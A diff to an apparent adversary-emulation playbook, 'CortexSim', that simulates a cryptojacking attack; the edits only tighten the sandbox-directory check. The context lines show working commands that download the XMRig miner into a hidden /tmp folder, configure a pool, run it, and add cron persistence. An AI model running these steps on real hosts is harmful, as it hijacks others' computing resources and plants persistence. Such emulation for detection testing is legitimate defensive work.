@@ -100,7 +100,7 @@ steps:
   - id: step-02
     name: "Download XMRig binary (Unit 42 observed delivery mechanism)"
     command: |
-      D=/tmp/.xmr; [ -d "$D" ] && [ ! -L "$D" ] && [ -O "$D" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }; \
+      D=/tmp/.xmr; [ "$(stat -c %F:%u:%a "$D" 2>/dev/null)" = "directory:$(id -u):755" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }; \
       ARCH=$(uname -m); \
       if [ "$ARCH" = "x86_64" ]; then XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"; \
       else XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-armv8.tar.gz"; fi; \
@@ -129,7 +129,7 @@ steps:
   - id: step-03
     name: "Configure XMRig mining pool connection"
     command: |
-      D=/tmp/.xmr; [ -d "$D" ] && [ ! -L "$D" ] && [ -O "$D" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      D=/tmp/.xmr; [ "$(stat -c %F:%u:%a "$D" 2>/dev/null)" = "directory:$(id -u):755" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }
       cat > /tmp/.xmr/config.json << 'XMRCFG'
       {
         "autosave": true,
@@ -158,7 +158,7 @@ steps:
 
   - id: step-04
     name: "Execute XMRig miner (limited to 30 seconds for simulation)"
-    command: "D=/tmp/.xmr; [ -d \"$D\" ] && [ ! -L \"$D\" ] && { [ -O \"$D\" ] || [ \"$(stat -c %u \"$D\")\" = 0 ]; } || { echo \"sandbox $D is missing or not owned by root: step-01 did not complete\" >&2; exit 1; }; timeout 30 /tmp/.xmr/xmrig --config /tmp/.xmr/config.json --no-color 2>&1 | head -50 | tee /tmp/.xmr/miner.log; echo '[CortexSim] XMRig execution window complete'"
+    command: "D=/tmp/.xmr; s=$(stat -c %F:%u:%a \"$D\" 2>/dev/null); [ \"$s\" = \"directory:0:755\" ] || [ \"$s\" = \"directory:$(id -u):755\" ] || { echo \"sandbox $D is missing or not owned by root: step-01 did not complete\" >&2; exit 1; }; timeout 30 /tmp/.xmr/xmrig --config /tmp/.xmr/config.json --no-color 2>&1 | head -50 | tee /tmp/.xmr/miner.log; echo '[CortexSim] XMRig execution window complete'"
     identity: nobody
     mitre_technique: "T1496"
     platforms: ["linux", "container"]
@@ -180,7 +180,7 @@ steps:
   - id: step-05
     name: "Attempt persistence via cron (Unit 42 observed TTPs)"
     command: |
-      D=/tmp/.xmr; [ -d "$D" ] && [ ! -L "$D" ] && [ -O "$D" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }; \
+      D=/tmp/.xmr; [ "$(stat -c %F:%u:%a "$D" 2>/dev/null)" = "directory:$(id -u):755" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }; \
       (crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.xmr/xmrig --config /tmp/.xmr/config.json >/dev/null 2>&1") | crontab - 2>/dev/null; \
       echo "*/5 * * * * /tmp/.xmr/xmrig --config /tmp/.xmr/config.json" >> /var/spool/cron/nobody 2>/dev/null || true; \
       echo '[*] Persistence attempt complete'
